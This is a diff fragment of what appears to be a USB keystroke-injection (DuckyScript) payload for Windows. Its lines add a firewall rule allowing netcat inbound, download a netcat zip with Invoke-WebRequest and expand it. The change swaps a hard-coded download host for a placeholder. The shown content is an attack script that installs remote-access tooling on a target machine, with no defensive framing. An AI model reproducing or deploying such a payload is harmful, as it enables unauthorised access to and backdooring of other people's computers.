@@ -12,7 +12,7 @@ STRING netsh advfirewall firewall add rule name="nc" dir=in action=allow program
 ENTER
 DELAY 400
 REM download nc
-STRING Invoke-WebRequest -uri http://jefruv.com/tmp/tmp.zip -OutFile nc.zip
+STRING Invoke-WebRequest -uri URIGOESHERE -OutFile nc.zip
 ENTER
 DELAY 800
 STRING expand-archive -path nc.zip -DestinationPath .\tmp
